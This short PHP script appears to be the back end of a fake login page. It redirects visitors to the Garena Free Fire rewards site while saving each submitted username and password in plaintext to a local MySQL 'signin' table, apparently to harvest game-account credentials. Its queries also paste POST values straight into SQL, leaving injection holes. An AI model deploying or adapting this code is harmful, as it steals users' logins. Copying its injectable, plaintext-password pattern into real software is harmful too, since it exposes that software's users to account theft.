<?php 
session_start();
header('location:https://reward.ff.garena.com/');
$con =mysqli_connect('localhost', 'root');
if($con){
	echo "connection successful";
}else{
	echo "no connection";
}
mysqli_select_db($con, 'sessionpractical');
$name =$_POST['user'];
$pass =$_POST['password'];

$query="select * from signin where name='$name' && password='$pass'";

$result =mysqli_query($con,$query);


$num=mysqli_num_rows($result);
if($num==1){
	echo "duplicate data";
}else
{
	echo"Connection successsful";
	$qy="insert into signin(name, password) values('$name', '$pass')";
	mysqli_query($con,$qy);
}


?>